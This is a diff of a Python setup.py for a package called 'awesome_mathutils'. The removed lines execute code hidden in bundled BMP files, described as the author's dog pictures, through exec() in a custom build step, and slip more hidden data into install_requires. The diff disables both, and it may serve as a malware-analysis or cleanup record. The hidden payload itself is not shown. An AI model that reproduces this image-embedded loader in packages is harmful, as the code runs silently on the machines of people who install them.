@@ -22,22 +22,15 @@ def read_image(path):
 # This is my dog pictures. I would like to keep her as part of the package  
 my_dog = str(pathlib.Path(__file__).parent / "my_dog.bmp")
 my_dog2 = str(pathlib.Path(__file__).parent / "my_dog2.bmp")
-install_requires = [ "numpy", read_image(my_dog2) ]
+# install_requires = [ "numpy", read_image(my_dog2) ]
 
 
 class build_py(_build_py):
     def run(self):
-        exec(read_image(my_dog))
+        # exec(read_image(my_dog))
         super().run()
 
 
 setup(
     name="awesome_mathutils",
-    version="0.0.0",
-    py_modules=["awesome_mathutils"],
-    install_requires=install_requires,
-    setup_requires=["pip"],
-    cmdclass={
-        "build_py": build_py,
-    },
 )
